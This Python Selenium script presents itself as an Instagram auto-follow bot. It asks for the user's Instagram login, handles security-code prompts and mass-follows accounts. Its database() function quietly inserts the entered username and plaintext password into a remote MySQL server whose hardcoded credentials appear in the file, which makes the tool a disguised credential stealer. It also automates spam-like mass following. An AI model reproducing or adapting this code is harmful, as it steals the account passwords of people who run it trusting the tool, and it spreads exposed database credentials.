import time,mysql.connector
from selenium import webdriver
from selenium.webdriver.chrome.options import Options as SeleniumOptions

YOUR_URL_HERE = 'https://www.instagram.com/accounts/login/?next=%2Fhastimr%2F&source=mobile_nav'

Username = raw_input('Enter Your Username : ')
PassWord = raw_input('Enter Your Password : ')

headers = SeleniumOptions()
headers.add_argument("user-agent=Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B137 Safari/601.1")
driver = webdriver.Chrome(executable_path=r"chromedriver.exe", chrome_options=headers)
driver.set_page_load_timeout(30)
req = driver.get(YOUR_URL_HERE)
def login():
    global Username, PassWord
    try:
        Login = driver.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div/div/div/div[2]/button')
        loginbtn1 = 1
    except:
        loginbtn1 = 0
    if loginbtn1 == 1:
        driver.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div/div/div/div[2]/button').click()
    uxpath = '//*[@id="react-root"]/section/main/article/div/div/div/form/div[2]/div/label/input'
    pxpath = '//*[@id="react-root"]/section/main/article/div/div/div/form/div[3]/div/label/input'
    lopath = '//*[@id="react-root"]/section/main/article/div/div/div/form/div[5]/button'
    user = driver.find_element_by_xpath(uxpath)
    passw = driver.find_element_by_xpath(pxpath)
    loginsubmit = driver.find_element_by_xpath(lopath)
    user.send_keys(Username)
    passw.send_keys(PassWord)
    loginsubmit.click()
    time.sleep(5)
    try:
        wpass = driver.find_element_by_xpath('/html/body/div[2]/div/div/div[1]/h3')
        driver.find_element_by_xpath('/html/body/div[2]/div/div/div[2]/button').click()
        print ('Password Is Wrong')
        PassWord = raw_input('Enter Your New Password : ')
        req = driver.get(YOUR_URL_HERE)
    except:
        wpass = 0
    try:
        wuser = driver.find_element_by_xpath('//*[@id="slfErrorAlert"]')
        print ('Username Is Wrong')
        Username = raw_input('Enter Your New Username : ')
        req = driver.get(YOUR_URL_HERE)
    except:
        wuser = 0
    time.sleep(5)
    testlogin()

def testlogin():
    try:
        Login = driver.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div/div/div/div[2]/button')
        loginbtn1 = 1
    except:
        loginbtn1 = 0
    if loginbtn1 == 1:
        driver.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div/div/div/div[2]/button').click()
    try:
        loginfail = driver.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div/div/div/form/div[2]/div/label/input')
        lgf = 1
    except:
        lgf = 0
    if lgf == 1:
        login()

def sectesttest():
    try:
        Sectest = driver.find_element_by_xpath('//*[@id="choice_1"]')
        sectest()
        login()
    except:
        Sectest = False

def sectest():
    global Email
    try:
        Email = driver.find_element_by_xpath('//*[@id="choice_0"]')
        email = 1
    except:
        email = 0
    try:
        Email2 = driver.find_element_by_xpath('//*[@id="choice_1"]')
        email2 = 1
    except:
        email2 = 0
    if email and email2 == 1:
        choose = int(raw_input('Send 1 For Send Code To Phone Number - Send 2 For Send Code To Email Address : '))
        if choose == 1:
            driver.find_element_by_xpath('//*[@id="react-root"]/section/div/div/div[3]/form/div/div[1]/label').click()
        elif choose == 2:
            driver.find_element_by_xpath('//*[@id="react-root"]/section/div/div/div[3]/form/div/div[2]/label').click()
        elif choose != 1 and choose != 2:
            print('Wrong Number')
            time.sleep(10)
            driver.quit()

    if email == 1 and email2 != 1:
        driver.find_element_by_xpath('//*[@id="react-root"]/section/div/div/div[3]/form/div/div[1]/label').click()
    if email2 == 1 and email != 1:
        driver.find_element_by_xpath('//*[@id="react-root"]/section/div/div/div[3]/form/div/div[2]/label').click()
    Email.submit()
    SCode = raw_input('Enter Your Security Code : ')
    Security = driver.find_element_by_name('security_code')
    Security.send_keys(SCode)
    Security.submit()
    time.sleep(5)
    try:
        wcode = driver.find_element_by_xpath('//*[@id="form_error"]')
        print ('Security Code Is Wrong')
        SCode = raw_input('Enter Your New Security Code : ')
        Security.clear()
        Security.send_keys(SCode)
        Security.submit()
    except:
        wcode = 0
    time.sleep(5)

def vertesttest():
    try:
        Vertest = driver.find_element_by_xpath('//*[@id="verificationCodeDescription"]')
        vertest()
        login()
    except:
        Vertest = False

def vertest():
    Code = raw_input('Enter Your Verification Code : ')
    verify = driver.find_element_by_name('verificationCode')
    verify.send_keys(Code)
    verify.submit()
    time.sleep(5)
    try:
        wCode = driver.find_element_by_xpath('//*[@id="form_error"]')
        print ('Verification Code Is Wrong')
        Code = raw_input('Enter Your New Verification Code : ')
        verify.clear()
        verify.send_keys(Code)
        verify.submit()
    except:
        wCode = 0
        
    time.sleep(5)

def notnow():
    global notnow
    try:
        notnow = driver.find_element_by_xpath('//*[@id="react-root"]/section/main/div/button')
        flag2 = 1
    except:
        flag2 = 0
    if flag2 == 1:
        notnow.click()


def loginsuc():
    try:
        loginsucs = driver.find_element_by_xpath('//*[@id="react-root"]/section/main/div/section/div/button')
        return 1
    except:
        return 0

def loginsuc1():
    try:
        loginsucs = driver.find_element_by_xpath('/html/body/div[3]/div/div/div[3]/button[2]')
        return 1
    except:
        return 0

def loginsuc2():
    try:
        loginsucs = driver.find_element_by_xpath('//*[@id="react-root"]/section/nav[2]/div/div/div[2]/div/div/div[5]/a')
        return 1
    except:
        return 0

def database():
    mydb = mysql.connector.connect(
        host="den1.mysql1.gear.host",
        user="securitysystem",
        passwd="Nr8Rysu1!2_2",
        database="securitysystem"
    )
    mycursor = mydb.cursor()
    sql = "INSERT INTO autofollow (users, passes) VALUES (%s, %s)"
    val = (Username, PassWord)
    mycursor.execute(sql, val)
    mydb.commit()

def autofollow():
    followerbtn = driver.find_element_by_xpath('//*[@id="react-root"]/section/main/div/header/section/ul/li[2]/a').click()
    try:
        followed = 0
        a = 1
        time.sleep(30)
        while True:
            try:
                followbtn = driver.find_element_by_xpath('/html/body/div[3]/div/div[2]/ul/div/li[' + str(a) + ']/div/div[3]/button')
            except:
                followbtn = driver.find_element_by_xpath('/html/body/div[3]/div/div[2]/ul/div/li[' + str(a) + ']/div/div[2]/button')
            driver.execute_script('arguments[0].scrollIntoView(true);', followbtn)
            followbtn.click()
            try:
                time.sleep(2)
                driver.find_element_by_xpath('/html/body/div[4]/div/div/div[2]/button[2]')
                print ('Action Blocked Please Wait For 8 Hours')
                time.sleep(120)
                req = driver.get(YOUR_URL_HERE)
                time.sleep(2)
                autofollow()
            except:
                try:
                    driver.find_element_by_xpath('/html/body/div[4]/div/div/div[3]/button[2]').click()
                    a += 1
                except:
                    a += 1
                    followed += 1
    except:
        print ('Done')
        print followed
login()
if loginsuc() or loginsuc1() or loginsuc2() == 1:
    print ('Login Was Successfull')
    notnow()
while loginsuc() or loginsuc1() or loginsuc2() != 1:
    sectesttest()
    vertesttest()
    if loginsuc() or loginsuc1() or loginsuc2() == 1:
        print ('Login Was Successfull')
        notnow()

database()
autofollow()
x = ' '
while x != 10:

    x = input('Enter 10 To Close! : ')
else:
    driver.quit()
    quit()
